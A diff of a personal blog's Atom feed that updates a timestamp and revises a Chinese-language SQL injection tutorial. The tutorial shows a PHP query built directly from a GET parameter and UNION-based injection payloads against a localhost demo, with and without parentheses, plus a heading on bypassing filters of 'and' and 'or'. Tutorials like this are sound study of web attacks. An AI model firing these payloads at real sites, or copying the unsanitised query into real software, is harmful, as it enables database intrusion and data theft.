@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://hagemon.github.io</id>
     <title>Hagemon&apos;s Log</title>
-    <updated>2021-06-28T11:11:58.175Z</updated>
+    <updated>2021-06-28T11:43:04.043Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://hagemon.github.io"/>
     <link rel="self" href="https://hagemon.github.io/atom.xml"/>
@@ -392,10 +392,10 @@ include($page);
 <pre><code class="language-php">$query = select * from users where id='$_GET['id']' LIMIT 0, 1
 </code></pre>
 <p>则构造payload</p>
-<pre><code>http://127.0.0.1/demo?id=-1' union select 1, 2, '3
+<pre><code>http://127.0.0.1/demo?id=-1' union select 1, 2, 3 or '1'='3
 </code></pre>
 <p>同样的，如果有括号的话则payload对应修改为</p>
-<pre><code>http://127.0.0.1/demo?id=-1') union select 1, 2, ('3
+<pre><code>http://127.0.0.1/demo?id=-1') union select 1, 2, 3 or '1'='3
 </code></pre>
 <h2 id="过滤and和or">过滤and和or</h2>
 <p>and和or可以用别的形式表示，可以尝试一下几种：</p>
